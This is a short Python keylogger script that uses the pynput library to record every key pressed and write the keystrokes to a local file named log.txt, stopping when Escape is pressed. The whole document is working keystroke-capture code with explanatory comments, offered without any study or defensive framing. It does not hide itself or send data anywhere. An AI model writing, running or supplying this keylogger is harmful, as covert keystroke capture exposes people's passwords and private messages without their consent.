from pynput.keyboard import Key, Listener

# List to store pressed keys
keys = []

def on_press(key):
    """Handles key press events."""
    keys.append(key)
    write_to_log(keys)

def write_to_log(keys):
    """Converts key events to string and writes to a log file."""
    with open('log.txt', 'w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")  # Remove quotes from key string
            logfile.write(key)

def on_release(key):
    """Stops listener when 'Escape' key is pressed."""
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()